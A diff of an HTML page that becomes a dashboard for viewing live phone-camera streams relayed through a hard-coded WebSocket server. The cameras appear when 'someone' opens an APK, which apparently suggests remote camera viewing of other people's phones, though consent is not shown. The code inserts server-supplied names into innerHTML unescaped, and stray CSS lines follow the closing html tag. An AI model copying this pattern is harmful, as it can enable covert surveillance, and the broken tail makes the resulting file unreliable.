@@ -1,40 +1,355 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>My Camera Stream</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Live Camera Viewer</title>
     <style>
-        body { 
-            font-family: Arial; 
-            text-align: center; 
-            padding: 20px;
-            background: black;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            padding: 16px;
+            min-height: 100vh;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        h1 {
             color: white;
+            font-size: 24px;
+            margin-bottom: 8px;
         }
-        .container {
-            max-width: 800px;
-            margin: auto;
-            background: #111;
-            padding: 20px;
+
+        .subtitle {
+            color: #888;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #ff4444;
+            display: inline-block;
+            animation: pulse 1.5s infinite;
+        }
+
+        .status-dot.connected {
+            background-color: #44ff44;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.5; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1.2); }
+        }
+
+        .camera-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .camera-card {
+            background: #1a1a1a;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 2px solid #333;
+            transition: transform 0.2s, border-color 0.2s;
+        }
+
+        .camera-card:hover {
+            transform: translateY(-4px);
+        }
+
+        .camera-card.online {
+            border-color: #44ff44;
+        }
+
+        .camera-header {
+            background: #222;
+            padding: 14px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .camera-name {
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .live-badge {
+            background: #ff4444;
+            color: white;
+            font-size: 10px;
+            padding: 2px 8px;
             border-radius: 20px;
+            font-weight: bold;
+            animation: blink 1s infinite;
         }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .video-container {
+            background: #000;
+            min-height: 240px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
         video {
             width: 100%;
-            border-radius: 10px;
-            background: #000;
-            border: 2px solid #00ff00;
+            height: 240px;
+            object-fit: cover;
         }
-        input, button {
-            padding: 12px;
-            margin: 10px;
-            font-size: 16px;
-            border-radius: 10px;
-            border: none;
+
+        .placeholder {
+            color: #666;
+            text-align: center;
+            font-size: 14px;
+            padding: 40px;
         }
-        input {
-            width: 250px;
-            background: #333;
+
+        .no-cameras {
+            text-align: center;
+            color: #666;
+            padding: 60px 20px;
+            background: #111;
+            border-radius: 16px;
+            margin: 20px;
+        }
+
+        .no-cameras-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+
+        .footer {
+            text-align: center;
+            color: #555;
+            font-size: 12px;
+            margin-top: 32px;
+            padding-top: 16px;
+            border-top: 1px solid #222;
+        }
+
+        @media (max-width: 768px) {
+            .camera-grid {
+                grid-template-columns: 1fr;
+            }
+            h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>📡 Live Camera Streams</h1>
+    <div class="subtitle">
+        <span class="status-dot" id="statusDot"></span>
+        <span id="connectionStatus">Connecting to server...</span>
+    </div>
+</div>
+
+<div id="cameraGrid" class="camera-grid">
+    <div class="no-cameras">
+        <div class="no-cameras-icon">📭</div>
+        <div>No cameras online</div>
+        <div style="font-size: 12px; margin-top: 8px;">Ask someone to open the APK</div>
+    </div>
+</div>
+
+<div class="footer">
+    🔒 Secure WebSocket | 📱 APK se connect karein
+</div>
+
+<script>
+    // 🔴 YAHAN APNA RENDER URL DALO! 🔴
+    const RENDER_URL = "wss://server-0cwb.onrender.com";
+    
+    let ws = null;
+    let activeCameras = new Map();
+    let videoElements = new Map();
+    let reconnectAttempts = 0;
+    let viewersList = new Map();
+
+    function updateConnectionStatus(connected, message = '') {
+        const statusText = document.getElementById('connectionStatus');
+        const statusDot = document.getElementById('statusDot');
+        
+        if (connected) {
+            statusDot.classList.add('connected');
+            statusText.innerHTML = message || '🟢 Connected - Watching for cameras';
+            reconnectAttempts = 0;
+        } else {
+            statusDot.classList.remove('connected');
+            statusText.innerHTML = message || '🔴 Disconnected - Reconnecting...';
+        }
+    }
+
+    function connectToServer() {
+        const viewerId = 'viewer_' + Math.random().toString(36).substr(2, 9);
+        
+        try {
+            ws = new WebSocket(`${RENDER_URL}?type=viewer&id=${viewerId}`);
+            
+            ws.onopen = () => {
+                console.log('✅ Connected to Render server');
+                updateConnectionStatus(true);
+            };
+            
+            ws.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    
+                    if (data.type === 'cameraList') {
+                        updateCameraList(data.cameras);
+                    } else if (data.type === 'frame') {
+                        displayFrame(data.cameraId, data.frame);
+                    }
+                } catch (e) {
+                    // If not JSON, might be binary data
+                    if (event.data instanceof Blob) {
+                        handleBinaryFrame(event.data);
+                    }
+                }
+            };
+            
+            ws.onclose = () => {
+                console.log('❌ Disconnected from server');
+                updateConnectionStatus(false);
+                
+                // Auto reconnect after 3 seconds
+                setTimeout(() => {
+                    if (reconnectAttempts < 10) {
+                        reconnectAttempts++;
+                        connectToServer();
+                    }
+                }, 3000);
+            };
+            
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+                updateConnectionStatus(false, '⚠️ Connection error - Retrying...');
+            };
+            
+        } catch (error) {
+            console.error('Connection failed:', error);
+            updateConnectionStatus(false, '❌ Cannot connect to server');
+        }
+    }
+
+    function updateCameraList(cameras) {
+        const grid = document.getElementById('cameraGrid');
+        
+        if (!cameras || cameras.length === 0) {
+            grid.innerHTML = `
+                <div class="no-cameras">
+                    <div class="no-cameras-icon">📭</div>
+                    <div>No cameras online</div>
+                    <div style="font-size: 12px; margin-top: 8px;">Ask someone to open the APK</div>
+                </div>
+            `;
+            return;
+        }
+        
+        grid.innerHTML = '';
+        
+        cameras.forEach(camera => {
+            const card = document.createElement('div');
+            card.className = 'camera-card online';
+            card.id = `camera-${camera.id}`;
+            
+            card.innerHTML = `
+                <div class="camera-header">
+                    <div class="camera-name">
+                        📱 ${camera.name || camera.id.slice(0, 8)}
+                    </div>
+                    <div class="live-badge">LIVE</div>
+                </div>
+                <div class="video-container" id="video-container-${camera.id}">
+                    <div class="placeholder">📹 Waiting for stream...</div>
+                </div>
+            `;
+            
+            grid.appendChild(card);
+            activeCameras.set(camera.id, camera);
+            
+            // Request to watch this camera
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'watch',
+                    cameraId: camera.id
+                }));
+            }
+        });
+    }
+
+    function displayFrame(cameraId, base64Frame) {
+        const container = document.getElementById(`video-container-${cameraId}`);
+        if (!container) return;
+        
+        let video = videoElements.get(cameraId);
+        if (!video) {
+            video = document.createElement('video');
+            video.autoplay = true;
+            video.muted = true;
+            video.playsInline = true;
+            video.style.width = '100%';
+            video.style.height = '240px';
+            video.style.objectFit = 'cover';
+            container.innerHTML = '';
+            container.appendChild(video);
+            videoElements.set(cameraId, video);
+        }
+        
+        video.src = `data:image/jpeg;base64,${base64Frame}`;
+    }
+
+    function handleBinaryFrame(blob) {
+        // For binary frame handling (if needed)
+        console.log('Received binary frame of size:', blob.size);
+    }
+
+    // Start connection when page loads
+    connectToServer();
+    
+    // Keep connection alive
+    setInterval(() => {
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type: 'ping' }));
+        }
+    }, 30000);
+</script>
+
+</body>
+</html>            background: #333;
             color: white;
         }
         button {
